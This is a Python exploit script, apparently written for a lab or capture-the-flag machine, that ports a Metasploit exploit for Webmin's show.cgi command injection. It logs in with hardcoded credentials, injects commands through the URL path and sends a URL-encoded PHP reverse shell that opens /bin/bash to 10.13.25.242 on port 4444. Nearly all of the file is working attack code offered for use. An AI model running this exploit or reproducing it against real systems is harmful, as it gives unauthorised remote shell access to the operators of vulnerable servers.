#!/usr/bin/env python

# Python implemenation of Metasploit exploit https://www.exploit-db.com/exploits/21851.

import requests;
import random;
import string;

php1_reverse_shell = "php%20-r%20%27%24sock%3Dfsockopen%28%2210.13.25.242%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27";
php1_reverse_shell_bash = "php%20-r%20%27%24sock%3Dfsockopen%28%2210.13.25.242%22%2C4444%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27";

host = "localhost:10000";
base_uri = "http://" + host;
login_uri = base_uri + "/session_login.cgi";
exploit_uri = base_uri + "/file/show.cgi/bin/";

data = {
	"page" : "/",
	"user" : "agent47",
	"pass" : "videogamer124",
}

cookies = {
	"testing" : "1",
	"sid" : "x",
}

headers = {
	"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"Accept-Encoding" : "gzip, deflate",
	"Accept-Language" : "en-US,en;q=0.5",
	"Connection" : "keep-alive",
	"Content-Length" : "40",
	"Content-Type" : "application/x-www-form-urlencoded",
	#"Cookie" : cookies,
	"Host" : host,
	"Origin" : base_uri,
	"Referer" : login_uri,
	"Upgrade-Insecure-Requests" : "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
}

s = requests.Session();

def login():
	print(f"{host} - Attempting to login.");
	r = s.post(login_uri, data = data, headers = headers, cookies = cookies);

	if ((r.status_code == 200) & (s.cookies.get("sid") != None)):
		print(f"{host} - Login successfull.");
	else:
		print(f"{host} - Login failed.");

def get_random_int(high):
	return random.randint(1, high);

def get_random_alphanum(rand, plus):
	str = string.ascii_lowercase;
	result = ''.join(random.choice(str) for i in range(get_random_int(rand) + plus));
	return result;

def check():
	print("Executing test.");
	subdir = get_random_alphanum(5, 0);
	to_echo = get_random_alphanum(5, 5);
	command = "echo " + to_echo;
	uri = exploit_uri + subdir + "|" + command + "|";
	r = s.get(uri);
	if ((r.status_code == 200) & (r.text.strip() == to_echo)):
		print("Check passed.  The system is exploitable.");
		return True;
	else:
		print("Check failed.  The system is not exploitable.");
		return False;

def exploit():
	print("Attempting exploit.");
	subdir = get_random_alphanum(5, 0);
	command = php1_reverse_shell_bash; # Need a URL encoded payload for a reverse shell.
	uri = exploit_uri + subdir + "|" + command + "|";
	r = s.get(uri);

login();
#check():
exploit();

